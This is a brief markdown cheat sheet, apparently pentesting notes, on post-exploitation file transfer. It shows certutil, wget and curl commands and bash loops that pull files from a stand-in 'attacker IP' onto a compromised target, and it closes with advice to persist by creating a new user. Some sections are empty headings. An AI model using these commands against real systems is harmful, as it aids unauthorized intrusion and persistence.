# Post Exploitation
## File Transfers
### Windows NT
#### Certutil
certutil.exe --urlcache -f http://IP
### Linux distros/BSD OS
#### HTTP
attacker: `python -m SimpleHTTPServer {port}`
target: 
- `wget http://attacker IP/filename`
- `curl http://attacker IP/filename --output filename`
- bash script:
````bash
# wget
#!/bin/bash
while read url;
 	do wget $url
# in urls.txt you have to insert the attacker IP and filename
done < urls.txt 

# ================

# curl
#!/bin/bash
while read url;
	do curl $url -O
# in urls.txt you have to insert the attacker IP and filename
done < urls.txt
````

 #### Browser

 #### Netcat

 Usually the best way to do so in a pentesting/redteaming assignment is creating a new user.
Try to avoid metasploit or other backdoor because you will lower the security level of the target machine.
